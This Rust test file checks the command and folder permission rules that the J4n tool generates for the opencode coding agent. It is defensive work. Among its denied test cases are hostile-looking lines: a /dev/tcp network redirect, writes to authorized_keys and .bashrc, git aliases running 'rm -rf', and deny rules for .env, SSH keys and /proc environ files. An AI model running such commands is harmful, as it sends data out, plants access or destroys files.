//! The permission config J4n makes for opencode: the rules of each approval level, checked against the config's own order (the last rule that
//! matches wins), what the task's program is given, and that nothing of the operator's is written.

use crate::bench::connectors;
use crate::world::Scratch;
use j4n_connect::manifest::GuardSpec;
use j4n_connect::permit::{bash, bash_walled, opencode, opencode_asking, opencode_scratch, opencode_walled, project_bash, refusal, verdict};

const OPENCODE_TOML: &str = include_str!("../../../../packs/connect/connectors/opencode.toml");

fn guard() -> GuardSpec {
    let bin = Scratch::new("permit");
    let (list, said, _) = connectors(&bin, OPENCODE_TOML);
    assert!(said.is_empty(), "{said:?}");
    list.get("opencode").and_then(|c| c.guard.clone()).expect("the pack's opencode has a `guard`")
}

fn says(full: bool, line: &str) -> &'static str {
    verdict(&bash(&guard(), full), line)
}

#[test]
fn what_reads_or_tests_is_allowed_and_wrappers_deletes_and_pushes_are_denied_at_both_levels() {
    for full in [false, true] {
        for line in ["ls -la", "cat a.txt", "pytest", "pytest -q tests", "python3 -m pytest -x", "python3 -m unittest discover", "cargo test -p x", "git status", "git diff", "git --no-pager diff",
            "git -C sub log", "git -c core.pager=cat show HEAD", "sed -n 1,5p f", "go version", "python3 --version", "make test"]
        {
            assert_eq!(says(full, line), "allow", "full={full}: {line}");
        }
        for line in ["rm -rf x", "bash -c 'echo hi'", "sh -c ls", "git push origin main", "git -C x push", "git --no-pager push",
            "sed -i s/a/b/ f", "sort -o out in", "find . -delete", "find . -exec rm {} ;", "rg --pre cmd x", "curl http://x", "wget x", "git reset --hard", "git branch -D x", "git stash drop",
            "cd ..", "cd /etc", "unknowncmd"]
        {
            assert_eq!(says(full, line), "deny", "full={full}: {line}");
        }
    }
}

#[test]
fn the_repositorys_own_writes_and_the_files_an_interpreter_runs_are_allowed_under_full_only() {
    for line in ["python3 s.py", "python s.py --x", "node a.js", "bash ./run.sh", "mkdir sub", "touch f", "cp a b", "mv a b", "git add -A", "git commit -m x", "git --no-pager commit -m x", "git -C sub add x",
        "git switch -c b", "git checkout -b b", "git tag v1", "git stash", "git worktree add x"]
    {
        assert_eq!(says(false, line), "deny", "strict: {line}");
        assert_eq!(says(true, line), "allow", "full: {line}");
    }
    assert_eq!(says(true, "git tag -d v1"), "deny");
}

#[test]
fn full_is_parity_with_the_gate_at_full_except_the_wrappers_the_gate_unwraps_and_strict_has_no_inline_code() {
    // the refusals were writes the gate allows at `--approval full`: inline code, a script on stdin, a checkout of a sha, `set -e`, a commit with an author in the environment
    for line in ["python3 -c 'print(1)'", "python -c 'x'", "python3 -I -c 'x'", "python3 - <<'EOF'", "node -e 1", "git checkout abc123", "git checkout main", "git switch --detach abc123", "set -e",
        "GIT_AUTHOR_NAME=x git commit -m y", "env GIT_AUTHOR_NAME=x git commit -m y", "GIT_AUTHOR_NAME=x git add -A", "printf x > out.txt", "echo x >> out.txt"]
    {
        assert_eq!(says(true, line), "allow", "full: {line}");
    }
    for line in ["python3 -c 'print(1)'", "python3 -", "node -e 1", "git checkout abc123", "GIT_AUTHOR_NAME=x git commit -m y", "set -e"] {
        assert_eq!(says(false, line), "deny", "strict: {line}");
    }
    // still denied: what J4n unwraps and opencode cannot, the destructive git, and the same forms behind an environment word
    for line in ["bash -c 'echo hi'", "sh -c 'x'", "bash -lc x", "git checkout -- f", "git checkout .", "git checkout -f main", "GIT_X=1 git push", "env A=b git push origin x", "GIT_X=1 git reset --hard",
        "git --no-pager checkout -- f", "rm x", "curl x", "git branch -D b"]
    {
        assert_eq!(says(true, line), "deny", "full: {line}");
    }
}

fn digest(rules: &[(String, &'static str)]) -> String {
    rules.iter().map(|(p, a)| format!("{a} {p}\n")).collect()
}

fn golden(name: &str, text: &str) {
    let path = format!("{}/../../fixtures/connectors/{name}", env!("CARGO_MANIFEST_DIR"));
    if std::env::var_os("J4N_BLESS").is_some() {
        std::fs::write(&path, text).unwrap();
    }
    assert_eq!(text, std::fs::read_to_string(&path).unwrap_or_default(), "{path} is not the rules: J4N_BLESS=1 writes it, and the diff is read before it is kept");
}

#[test]
fn the_rules_of_each_level_are_their_goldens() {
    let g = guard();
    golden("opencode-guard-strict.txt", &digest(&bash(&g, false)));
    golden("opencode-guard-full.txt", &digest(&bash(&g, true)));
}

#[test]
fn the_config_is_one_json_with_the_rules_in_order_and_the_folders_of_the_task_and_nothing_else() {
    let g = guard();
    let dir = std::path::Path::new("/work/proj");
    let text = opencode(&g, true, false, dir, &[std::path::PathBuf::from("/work/proj.git")], &opencode_scratch(None));
    let v: serde_json::Value = serde_json::from_str(&text).expect("JSON");
    let p = &v["permission"];
    assert_eq!((p["edit"].as_str(), p["webfetch"].as_str(), p["websearch"].as_str()), (Some("allow"), Some("deny"), Some("deny")));
    // the order is the meaning: `*` is the first of the bash rules, and a denial comes after the allow it narrows
    let keys: Vec<&str> = text.split("\"bash\":{").nth(1).unwrap().split('}').next().unwrap().split("\":\"").map(|s| s.rsplit('"').next().unwrap_or("")).collect();
    assert!(!keys.is_empty());
    let at = |k: &str| text.find(&format!("\"{k}\":")).unwrap_or_else(|| panic!("{k} is not a rule"));
    assert!(at("*") < at("ls *") && at("python3 *.py*") < at("python3 -c*") && at("git add *") < at("git push*"));
    // the task's folders, and no other, may be reached; the credentials are never read
    let outside = p["external_directory"].as_object().unwrap();
    assert_eq!(outside["*"], "deny");
    assert!(outside["/work/proj/*"] == "allow" && outside["/work/proj.git"] == "allow" && outside.len() == 7, "{outside:?}");
    // opencode's own scratch folder is let through, exactly that one: its tool output too long to show goes there
    assert!(outside["/tmp/opencode"] == "allow" && outside["/tmp/opencode/*"] == "allow" && !outside.contains_key("/tmp/*") && !outside.contains_key("/tmp"), "{outside:?}");
    assert_eq!(p["read"]["*.env"], "deny");
    assert_eq!(p["read"]["*/.ssh/id_*"], "deny");
    // J4n's own keys and salt, and the environment and memory of every process, are never read, asked or not
    for key in ["*/.j4n/keys*", "*/.j4n/guard.salt*", "*/proc/*/environ*", "*/proc/*/mem*"] {
        assert_eq!(p["read"][key], "deny", "{key}: {}", p["read"]);
    }
    let asking: serde_json::Value = serde_json::from_str(&opencode_asking(&g, true, false, dir, &[], &opencode_scratch(None), false, None)).expect("JSON");
    assert_eq!(asking["permission"]["read"]["*/.j4n/guard.salt*"], "deny");
    // a task that may only read may not edit
    let read = opencode(&g, false, true, dir, &[], &opencode_scratch(None));
    assert!(read.contains("\"edit\":\"deny\""));
}

#[test]
fn the_scratch_folder_of_opencode_is_under_the_temporary_folder_it_runs_with() {
    assert_eq!(opencode_scratch(None), std::path::PathBuf::from("/tmp/opencode"));
    assert_eq!(opencode_scratch(Some("")), std::path::PathBuf::from("/tmp/opencode"), "an empty TMPDIR is none");
    assert_eq!(opencode_scratch(Some("/run/user/1000/tmp")), std::path::PathBuf::from("/run/user/1000/tmp/opencode"));
    assert_eq!(opencode_scratch(Some("/var/tmp/")), std::path::PathBuf::from("/var/tmp/opencode"), "a slash at the end is not another folder");
    let g = guard();
    let text = opencode(&g, false, false, std::path::Path::new("/work/proj"), &[], &opencode_scratch(Some("/var/tmp")));
    let v: serde_json::Value = serde_json::from_str(&text).expect("JSON");
    assert_eq!((v["permission"]["external_directory"]["/var/tmp/opencode/*"].as_str(), v["permission"]["external_directory"]["*"].as_str()), (Some("allow"), Some("deny")), "{text}");
}

// ---- the rules are fewer, with the same answers; a refusal is one sentence; `cd` to the task's own folder ----

/// The rules as they were made before the rules were merged: a rule on a program, and the rule on the program with its arguments, each of its own, matched by the glob alone.
fn expanded(rules: &[(String, &'static str)]) -> Vec<(String, &'static str)> {
    rules.iter().flat_map(|(p, a)| p.strip_suffix(" *").map(|bare| (bare.to_string(), *a)).into_iter().chain(std::iter::once((p.clone(), *a)))).collect()
}

#[test]
fn the_rules_are_fewer_and_every_line_has_the_verdict_it_had() {
    let g = guard();
    for full in [false, true] {
        let now = bash(&g, full);
        let before = expanded(&now);
        assert!(now.len() * 10 < before.len() * 7, "full={full}: {} rules, {} before: a rule on a program stands for it with and without arguments", now.len(), before.len());
        assert!(!now.iter().any(|(p, _)| now.iter().any(|(q, _)| *q == format!("{p} *"))), "a rule and the same rule with its arguments");
        // every line a rule is made for, with the arguments and without, and the lines the other tests use
        let mut lines: Vec<String> = now.iter().flat_map(|(p, _)| [p.replace('*', "x"), p.trim_end_matches(" *").replace('*', "x"), p.replace(" *", "")]).collect();
        lines.extend(["ls", "ls -la", "pytest", "git status", "git -C a status", "unknowncmd", "git push", "cd ..", "python3 -c x", "GIT_A=1 git commit -m x", "env A=b git log"].map(String::from));
        for line in lines {
            let was = before.iter().rev().find(|(p, _)| j4n_core::eval::glob_match(p, &line)).map_or("ask", |(_, a)| a);
            assert_eq!(verdict(&now, &line), was, "full={full}: {line}");
        }
    }
    // the size of what a refusal carries is the size of the rules: about half of the 398 and 680 rules of the goldens before this card
    let strict = opencode(&g, false, false, std::path::Path::new("/work/proj"), &[], &opencode_scratch(None));
    let full = opencode(&g, true, false, std::path::Path::new("/work/proj"), &[], &opencode_scratch(None));
    assert!(strict.len() < 9_000 && full.len() < 15_000, "{} and {} characters", strict.len(), full.len());
}

#[test]
fn a_refusal_is_one_sentence_with_the_line_clipped_and_the_group_when_the_words_say_it() {
    assert_eq!(refusal("rm -rf build"), "J4n's guard refused `rm -rf build`: it deletes.");
    assert_eq!(refusal("find . -delete"), "J4n's guard refused `find . -delete`: it deletes.");
    assert_eq!(refusal("git push origin main"), "J4n's guard refused `git push origin main`: it uses the network.");
    assert_eq!(refusal("curl http://x"), "J4n's guard refused `curl http://x`: it uses the network.");
    assert_eq!(refusal("bash -c 'echo hi'"), "J4n's guard refused `bash -c 'echo hi'`: it wraps another command or runs inline code.");
    assert_eq!(refusal("python3 -c 'print(1)'"), "J4n's guard refused `python3 -c 'print(1)'`: it wraps another command or runs inline code.");
    assert_eq!(refusal("cd /etc && ls"), "J4n's guard refused `cd /etc && ls`: it leaves the project.");
    assert_eq!(refusal("cat ../secret"), "J4n's guard refused `cat ../secret`: it leaves the project.");
    assert!(refusal("unknowncmd --x").ends_with("it is not a command this task may run."), "{}", refusal("unknowncmd --x"));
    let long = format!("echo {}", "x".repeat(900));
    let said = refusal(&long);
    assert!(said.chars().count() < 300 && said.contains('…'), "{said}");
}

const DEEP: &str = "/home/user/Projects/bench/runs/run-20261112.g2-r1/work/q-graph.L3_v2.1";

#[test]
fn cd_to_the_tasks_own_folder_is_allowed_at_both_levels_and_a_way_out_of_it_is_not() {
    let g = guard();
    let dir = std::path::Path::new(DEEP);
    for full in [false, true] {
        let rules = project_bash(&g, full, dir);
        let says = |line: &str| verdict(&rules, line);
        for line in [format!("cd {DEEP}"), format!("cd \"{DEEP}\""), format!("cd '{DEEP}'"), format!("cd {DEEP}/sub/dir"), format!("cd {DEEP}/")] {
            assert_eq!(says(&line), "allow", "full={full}: {line}");
        }
        for line in [format!("cd {DEEP}/.."), format!("cd {DEEP}/sub/../../.."), format!("cd {DEEP}-other"), format!("cd {DEEP}x"), "cd /etc".to_string(), "cd /home/user".to_string(), "cd ..".to_string(), "cd ~".to_string(), "cd /".to_string()] {
            assert_eq!(says(&line), "deny", "full={full}: {line}");
        }
        assert_eq!(says("cd sub"), "allow", "a folder of the task, written the short way");
        // the rules of the folder come last: the denial of every absolute `cd` is before them
        let at = |pattern: &str| rules.iter().rposition(|(p, _)| p == pattern).unwrap_or_else(|| panic!("no rule {pattern}"));
        assert!(at("cd /*") < at(&format!("cd {DEEP}")), "last match wins");
    }
}

#[test]
fn the_folder_is_also_allowed_as_the_system_spells_it_when_a_link_leads_to_it() {
    let g = guard();
    let base = std::env::temp_dir().join(format!("j4n-t528-{}", std::process::id()));
    let real = base.join("real-folder.v1");
    std::fs::create_dir_all(&real).unwrap();
    let link = base.join("link-to-it");
    let _ = std::fs::remove_file(&link);
    std::os::unix::fs::symlink(&real, &link).unwrap();
    let rules = project_bash(&g, true, &link);
    let spelled = real.canonicalize().unwrap();
    assert_eq!(verdict(&rules, &format!("cd {}", link.display())), "allow");
    assert_eq!(verdict(&rules, &format!("cd {}", spelled.display())), "allow", "the program reports its folder as the system does");
    // and the fence of the paths has both
    let text = opencode(&g, true, false, &link, &[], &opencode_scratch(None));
    let v: serde_json::Value = serde_json::from_str(&text).unwrap();
    let outside = v["permission"]["external_directory"].as_object().unwrap();
    assert!(outside.contains_key(&format!("{}/*", link.display())) && outside.contains_key(&format!("{}/*", spelled.display())), "{outside:?}");
    let _ = std::fs::remove_dir_all(&base);
}

#[test]
fn the_test_runners_with_python_and_their_or_are_allowed_each_on_its_own() {
    // opencode matches each command of a `a || b` line by itself; `python` is as good as `python3`
    let g = guard();
    for full in [false, true] {
        let rules = project_bash(&g, full, std::path::Path::new(DEEP));
        for line in ["python -m pytest", "python -m pytest tests/test_graph.py -x -q", "python -m pytest -q 2>&1", "python -m unittest", "python -m unittest discover -s tests -v", "python -m unittest tests.test_graph",
            "python3 -m pytest -q", "python -I -m pytest -q", "tail -n 20", "head -50"]
        {
            assert_eq!(verdict(&rules, line), "allow", "full={full}: {line}");
        }
    }
}

// ---- lines the gate passes at full and opencode's config refused, of the kind opencode's own Log shows ----

#[test]
fn a_heredoc_file_write_was_never_the_refusal_and_stays_allowed_with_its_whole_text_as_the_pattern() {
    // opencode names a command that has a redirect by the text of the whole statement, heredoc body included, so `cat *` is the rule that reads it
    for full in [false, true] {
        for line in [
            "cat > .order_check.log <<'EOF'\n\n# comment line\n2001-02-03T04:05:06+02:00 INFO api ref=r1 amount=\"1,234.56\"\nEOF",
            "cat >> notes.txt <<'EOF'\nmore\nEOF",
            "cat > q9/shapes.py <<'PYEOF'\nRATES = {\"fast\": 3}\nPYEOF",
            "echo x > out.txt",
            "ls -la .git/hooks/ 2>&1",
        ] {
            assert_eq!(says(full, line), "allow", "full={full}: {line}");
        }
    }
    // such lines were refused for what came with them: a `rm` at the end, a path outside the project
    for line in ["rm .order_check.log", "rm -rf q9 q10 .v.py", "rm -f tie.csv messy.csv"] {
        assert_eq!(says(true, line), "deny", "the destructive blocks wait for the operator: {line}");
    }
    for line in ["mkdir -p q9 q10", "mkdir -p opencode/messy"] {
        assert_eq!(says(true, line), "allow", "{line}");
    }
}

#[test]
fn the_cd_of_the_projects_own_long_path_was_allowed_and_the_refusal_was_a_module_and_a_listing() {
    let g = guard();
    let deep = "/home/user/.cache/bench/work/r-1-cheap-a1/q-a_long_task_name_L3_s000001_c0000000-cheap-a1-j4n-agent-model-0";
    // `cd D && python3 -m coverage --version 2>/dev/null || pip list 2>/dev/null | grep -i coverage || echo NOCOV` is six commands, each named on its own
    for (full, want) in [(false, "deny"), (true, "allow")] {
        let rules = project_bash(&g, full, std::path::Path::new(deep));
        let says = |l: &str| verdict(&rules, l);
        assert_eq!(says(&format!("cd {deep}")), "allow", "the `cd` rule held: it was never the cd");
        for line in ["python3 -m coverage --version 2>/dev/null", "pip list 2>/dev/null", "python -m json.tool x.json", "pip3 show requests", "pip freeze", "python3 -m pip list"] {
            assert_eq!(says(line), want, "full={full}: {line}");
        }
        for line in ["grep -i coverage", "echo NOCOV"] {
            assert_eq!(says(line), "allow", "{line}");
        }
    }
    // pip changes the machine in other ways: they stay denied, and so does a web server
    for line in ["pip install x", "pip3 install -r r.txt", "python3 -m pip install x", "python -m pip uninstall x", "python3 -m pip download x", "python3 -m http.server 8000", "pip uninstall x"] {
        assert_eq!(says(true, line), "deny", "{line}");
    }
}

#[test]
fn git_c_advice_detachedhead_before_a_checkout_is_allowed_at_full_and_no_other_c_is() {
    for line in ["git -c advice.detachedHead=false checkout -q dd16ab4 2>/dev/null", "git -c advice.detachedHead=false checkout -q $c 2>/dev/null", "git -c advice.detachedHead=false switch --detach abc", "git -c advice.detachedHead=false checkout HEAD"] {
        assert_eq!(says(true, line), "allow", "{line}");
        assert_eq!(says(false, line), "deny", "strict: {line}");
    }
    // the same flag does not make a destructive form or another verb allowed, and no other `-c` is a rule
    for line in [
        "git -c advice.detachedHead=false checkout -f x", "git -c advice.detachedHead=false checkout -- f", "git -c advice.detachedHead=false checkout . ", "git -c advice.detachedHead=false push",
        "git -c advice.detachedHead=false reset --hard", "git -c advice.detachedHead=false commit -m x", "git -c core.fsmonitor=evil checkout x", "git -c alias.x=!rm checkout x", "git -c advice.statusHints=false checkout x",
    ] {
        assert_eq!(says(true, line), "deny", "{line}");
    }
    // the loop in it is five commands of what is already allowed, and the one more
    for line in ["python3 -m unittest discover -s tests 2>&1", "tail -1", "echo \"$c: $r\"", "git checkout -q HEAD"] {
        assert_eq!(says(true, line), "allow", "{line}");
    }
}

#[test]
fn a_script_on_stdin_after_a_cd_is_named_python3_and_nothing_more_and_that_is_a_rule_at_full_only() {
    for line in ["python3", "python", "python3 -I", "python -I", "python3 - <<'EOF'\nimport re\nEOF", "python3 -"] {
        assert_eq!(says(true, line), "allow", "full: {line}");
    }
    for line in ["python3", "python -I", "python3 -"] {
        assert_eq!(says(false, line), "deny", "strict: {line}");
    }
    // the bare word is a rule on the bare word: another script, an unknown module's flags and an interpreter's other programs are as they were
    for line in ["python3 evil", "python3 -X dev", "python3 -u", "node", "perl", "bash"] {
        assert_eq!(says(true, line), "deny", "{line}");
    }
}

#[test]
fn git_config_reads_a_key_at_full_and_a_get_or_a_list_everywhere_and_a_set_is_denied() {
    for full in [false, true] {
        for line in ["git config --get core.hooksPath", "git config --list", "git config -l", "git config --get-all remote.origin.url", "git -C sub config --get user.name"] {
            assert_eq!(says(full, line), "allow", "full={full}: {line}");
        }
    }
    for line in ["git config core.hooksPath", "git config user.name", "git config user.email", "git config remote.origin.url"] {
        assert_eq!(says(true, line), "allow", "full: {line}");
        assert_eq!(says(false, line), "deny", "strict: {line}");
    }
    // the same with a value, another key, an alias, an option that sets: writes the gate may allow at full and the config does not
    for line in ["git config core.hooksPath /tmp/h", "git config user.name x", "git config alias.x '!rm -rf .'", "git config core.sshCommand evil", "git config --global user.name x", "git config --unset user.name", "git config core.editor"] {
        assert_eq!(says(true, line), "deny", "{line}");
    }
    // the line of that run, command by command
    for line in ["ls -la .git/hooks/ 2>&1", "grep -v '\\.sample'", "echo \"---core.hooksPath---\"", "git config core.hooksPath", "git log --oneline -10", "git status"] {
        assert_eq!(says(true, line), "allow", "{line}");
    }
}

// ---- the target of a redirect, which opencode does not fence ----

#[test]
fn at_the_level_where_the_gate_asks_a_redirect_out_of_the_project_is_refused_and_one_inside_it_or_to_dev_null_is_not() {
    for line in [
        "echo x > ~/.bashrc",
        "cat > /etc/x <<'EOF'\nline\nEOF",
        "echo x > ../x",
        "echo x >../x",
        "echo x >> ~/notes",
        "ls > /tmp/out",
        "ls >/tmp/out",
        "cat a >> /var/log/x",
        "grep x f > /home/me/.ssh/authorized_keys",
        "echo x 2> /root/err",
        "echo x &>/etc/x",
        "echo x > $HOME/x",
        "echo x > $out",
        "echo x > \"/etc/x\"",
        "echo x > '/etc/x'",
        "echo x > sub/../../x",
        "cat < in > /mnt/x",
        "echo hi >/dev/tcp/10.0.0.1/80",
        "echo hi > /dev/udp/10.0.0.1/53",
        // known cost: a pattern reads the whole statement, so a body that holds one is refused too
        "cat > notes.md <<'EOF'\nsend it to >/home/me\nEOF",
    ] {
        assert_eq!(says(false, line), "deny", "strict: {line}");
    }
    for line in [
        "cat > notes.md <<'EOF'\nmore\nEOF",
        "cat >> notes.md <<'EOF'\nmore\nEOF",
        "ls 2>/dev/null",
        "ls > /dev/null",
        "ls -la &>/dev/null",
        "grep x f 2>&1",
        "cat a > out/b.txt",
        "echo x > out.txt",
        "ls 2>&1 | grep -v '\\.sample'",
        "printf '%s' 'a>b' | cat",
    ] {
        assert_eq!(says(false, line), "allow", "strict: {line}");
    }
}

#[test]
fn at_full_the_redirect_is_as_the_gate_has_it_the_gate_passes_the_write_at_full_so_the_config_does_too() {
    for line in ["echo x > ~/.bashrc", "cat > /etc/x <<'EOF'\nline\nEOF", "echo x > ../x", "ls > /tmp/out", "cat > notes.md <<'EOF'\nmore\nEOF", "ls 2>/dev/null"] {
        assert_eq!(says(true, line), "allow", "full: {line}");
    }
}

#[test]
fn the_denials_are_the_last_rules_of_the_strict_config_and_the_other_rules_are_as_they_were() {
    let g = guard();
    let strict = bash(&g, false);
    let last: Vec<&(String, &str)> = strict.iter().rev().take(39).collect();
    assert!(last.iter().all(|(p, a)| *a == "deny" && p.contains('>')), "{last:?}");
    assert_eq!(strict.len(), 229 + 8 + 39, "the 229 rules for lines of a loop over commits, the 8 for `check-ignore` and `check-attr` (four forms each) and the 39 for redirects");
    assert_eq!(bash(&g, true).len(), 462 + 12, "full has none of them (and the 12 for its two verbs in six forms)");
}

// ---- behind the box the OS is the fence, so the deletes are rules at full and the redirect patterns are not made ----

#[test]
fn behind_the_box_at_full_the_deletes_are_allowed_and_unboxed_or_at_strict_they_are_not() {
    let g = guard();
    let walled = bash_walled(&g, true, true);
    let says = |rules: &[(String, &'static str)], l: &str| verdict(rules, l);
    for line in ["rm -rf ./build", "rm tie.csv messy.csv", "rm -f a b", "rm .order_check.log", "rm -rf q9 q10 .v.py", "rmdir x", "find . -name '*.pyc' -delete", "find . -exec rm {} ;"] {
        assert_eq!(says(&walled, line), "allow", "boxed, full: {line}");
        assert_eq!(says(&bash_walled(&g, true, false), line), "deny", "unboxed, full: {line}");
        assert_eq!(says(&bash_walled(&g, false, true), line), "deny", "boxed, strict: {line}");
    }
    // only the deletes are let through: the rest of what stays denied is as it was
    for line in ["git push origin main", "git reset --hard", "git clean -fd", "curl http://x", "bash -c 'rm -rf x'", "sh -c ls", "pip install x", "python3 -m http.server", "unknowncmd"] {
        assert_eq!(says(&walled, line), "deny", "{line}");
    }
    // the wall holds the redirects, so the patterns that stood for it are not made behind it, and they are made without it
    for line in ["echo x > ~/.bashrc", "cat > /etc/x <<'EOF'\nx\nEOF", "echo x > ../x"] {
        assert_eq!(says(&bash_walled(&g, false, true), line), "allow", "boxed, strict: {line}");
        assert_eq!(says(&bash_walled(&g, false, false), line), "deny", "unboxed, strict: {line}");
        assert_eq!(says(&walled, line), "allow", "boxed, full: {line}");
    }
    assert_eq!(bash_walled(&g, true, true).len(), bash(&g, true).len() + 4, "the four rules of `boxed_allow`, and nothing else");
    assert_eq!(bash_walled(&g, false, true).len(), bash(&g, false).len() - 39, "strict behind the box has no redirect patterns");
}

#[test]
fn the_config_the_task_is_given_says_the_same_in_json() {
    let g = guard();
    let dir = std::path::Path::new("/work/proj");
    let scratch = opencode_scratch(None);
    let boxed = opencode_walled(&g, true, false, dir, &[], &scratch, true);
    let plain = opencode(&g, true, false, dir, &[], &scratch);
    assert!(boxed.contains("\"rmdir *\":\"allow\"") && !plain.contains("\"rmdir *\":\"allow\""));
    assert!(boxed.len() > plain.len());
    let v: serde_json::Value = serde_json::from_str(&boxed).expect("JSON");
    assert_eq!(v["permission"]["bash"]["rm *"], "allow");
}

// ---- opencode over ACP, its asks answered by J4n's gate ----

fn pair() -> (GuardSpec, GuardSpec) {
    let bin = Scratch::new("permit-acp");
    let (list, said, _) = connectors(&bin, OPENCODE_TOML);
    assert!(said.is_empty(), "{said:?}");
    let g = |id: &str| list.get(id).and_then(|c| c.guard.clone()).unwrap_or_else(|| panic!("{id} has a guard"));
    (g("opencode"), g("opencode-acp"))
}

#[test]
fn the_acp_row_has_the_guard_of_the_run_row_so_the_two_lists_do_not_drift() {
    let (run, acp) = pair();
    assert_eq!(format!("{run:?}"), format!("{acp:?}"));
}

fn rules_of(config: &str, key: &str) -> Vec<(String, String)> {
    // the object in the order it is written: the order is the meaning
    let start = config.find(&format!("\"{key}\":{{")).unwrap_or_else(|| panic!("no {key} in {config}")) + key.len() + 3;
    let body = &config[start..];
    let end = body.find('}').expect("an object");
    let mut out = Vec::new();
    for row in body[..end].split("\",\"") {
        let row = row.trim_matches(|c| c == '{' || c == '"');
        if let Some((k, v)) = row.rsplit_once("\":\"") {
            out.push((k.to_string(), v.trim_matches('"').to_string()));
        }
    }
    out
}

#[test]
fn the_asking_config_denies_nothing_of_bash_or_folders_it_asks_and_what_it_allowed_stays_allowed() {
    let g = pair().1;
    let dir = std::path::Path::new("/work/proj");
    let scratch = opencode_scratch(Some("/work/tmp/t1"));
    for full in [false, true] {
        for walled in [false, true] {
            let ran = opencode_walled(&g, full, false, dir, &[], &scratch, walled);
            let asking = opencode_asking(&g, full, false, dir, &[], &scratch, walled, None);
            let (before, after) = (rules_of(&ran, "bash"), rules_of(&asking, "bash"));
            assert_eq!(before.len(), after.len(), "the same rules, in the same order");
            for ((pb, vb), (pa, va)) in before.iter().zip(&after) {
                assert_eq!(pb, pa);
                match vb.as_str() {
                    "deny" => assert_eq!(va, "ask", "`{pb}` was denied: it is asked now"),
                    other => assert_eq!(va, other, "`{pb}` stays as it was"),
                }
            }
            assert!(after.iter().all(|(_, v)| v != "deny"));
            let folders = rules_of(&asking, "external_directory");
            assert_eq!(folders[0], ("*".to_string(), "ask".to_string()), "{folders:?}");
            assert!(folders.iter().any(|(k, v)| k.starts_with("/work/proj") && v == "allow") && folders.iter().all(|(_, v)| v != "deny"), "{folders:?}");
            // a credential is still never read, the project's files are allowed to be edited, the web is asked
            assert!(rules_of(&asking, "read").iter().any(|(k, v)| k.contains(".env") && v == "deny"));
            assert!(asking.contains("\"edit\":\"allow\"") && asking.contains("\"webfetch\":\"ask\"") && asking.contains("\"websearch\":\"ask\""), "{asking}");
        }
    }
    // read-only: no edit; the model is the session's default
    let ro = opencode_asking(&g, false, true, dir, &[], &scratch, false, Some("opencode/big-pickle"));
    assert!(ro.contains("\"edit\":\"deny\"") && ro.contains("\"model\":\"opencode/big-pickle\""), "{ro}");
    assert!(!opencode_asking(&g, false, false, dir, &[], &scratch, false, Some("")).contains("\"model\""));
    let v: serde_json::Value = serde_json::from_str(&ro).expect("the config is JSON");
    assert_eq!(v["permission"]["bash"]["*"], "ask");
}
